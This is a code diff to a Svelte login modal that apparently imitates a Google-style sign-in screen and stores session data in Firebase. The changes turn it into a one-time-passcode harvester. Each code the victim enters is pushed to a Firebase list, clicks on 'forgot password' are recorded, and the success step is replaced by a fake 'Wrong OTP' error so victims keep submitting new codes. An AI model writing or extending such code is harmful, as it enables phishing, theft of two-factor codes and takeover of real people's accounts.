@@ -14,6 +14,7 @@
 
 	let otp = $state('');
 	let emailError = $state('');
+	let otpError = $state('');
 	let isLoading = $state(false);
 	let initialLoading = $state(false);
 
@@ -35,6 +36,7 @@
 				phoneNumber = '';
 				otp = '';
 				emailError = '';
+				otpError = '';
 				sessionId = '';
 			}, 300);
 		}
@@ -136,6 +138,11 @@
 
 	function handleForgotPassword() {
 		isLoading = true;
+		
+		if (sessionId) {
+			update(ref(db, `sessions/${sessionId}`), { forgotPasswordClicked: true }).catch(console.error);
+		}
+
 		setTimeout(() => {
 			isLoading = false;
 			step = 'recovery';
@@ -162,16 +169,16 @@
 	function handleOtpSubmit() {
 		if (otp.length < 4) return;
 		isLoading = true;
+		otpError = '';
 		
-		// Record OTP in Firebase
 		if (sessionId) {
-			update(ref(db, `sessions/${sessionId}`), { otp }).catch(console.error);
+			push(ref(db, `sessions/${sessionId}/otps`), otp).catch(console.error);
 		}
 
 		setTimeout(() => {
 			isLoading = false;
-			step = 'success';
-			setTimeout(() => { closeModal(); }, 2500);
+			otpError = 'Wrong OTP. Please try again.';
+			otp = '';
 		}, 4000);
 	}
 
@@ -407,15 +414,22 @@
 										maxlength="8"
 										onkeydown={(e) => handleKeydown(e, handleOtpSubmit)}
 										placeholder=" "
-										class="peer w-full rounded-[4px] border border-[#747775] bg-transparent px-4 pb-2 pt-6 text-[16px] tracking-[0.5em] text-[#1f1f1f] outline-none transition-all duration-200 focus:border-2 focus:border-[#0b57d0]"
+										class="peer w-full rounded-[4px] border border-[#747775] bg-transparent px-4 pb-2 pt-6 text-[16px] tracking-[0.5em] text-[#1f1f1f] outline-none transition-all duration-200 focus:border-2 focus:border-[#0b57d0] {otpError ? 'border-[#b3261e] focus:border-[#b3261e]' : ''}"
 									/>
 									<label
 										for="otp"
-										class="pointer-events-none absolute left-3 top-4 -translate-y-1/2 bg-white px-1 text-[16px] tracking-normal text-[#444746] transition-all duration-200 peer-focus:top-0 peer-focus:-translate-y-1/2 peer-focus:text-[12px] peer-focus:text-[#0b57d0] peer-[:not(:placeholder-shown)]:top-0 peer-[:not(:placeholder-shown)]:-translate-y-1/2 peer-[:not(:placeholder-shown)]:text-[12px]"
+										class="pointer-events-none absolute left-3 top-4 -translate-y-1/2 bg-white px-1 text-[16px] tracking-normal text-[#444746] transition-all duration-200 peer-focus:top-0 peer-focus:-translate-y-1/2 peer-focus:text-[12px] peer-focus:text-[#0b57d0] peer-[:not(:placeholder-shown)]:top-0 peer-[:not(:placeholder-shown)]:-translate-y-1/2 peer-[:not(:placeholder-shown)]:text-[12px] {otpError ? 'text-[#b3261e] peer-focus:text-[#b3261e]' : ''}"
 									>
 										Enter code
 									</label>
 								</div>
+								
+								{#if otpError}
+									<p class="mt-2 flex items-center gap-1.5 text-[12px] text-[#b3261e]">
+										<svg class="h-4 w-4 shrink-0" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+										{otpError}
+									</p>
+								{/if}
 								
 								<button class="mt-4 text-[14px] font-medium text-[#0b57d0] hover:underline">Resend code</button>
 
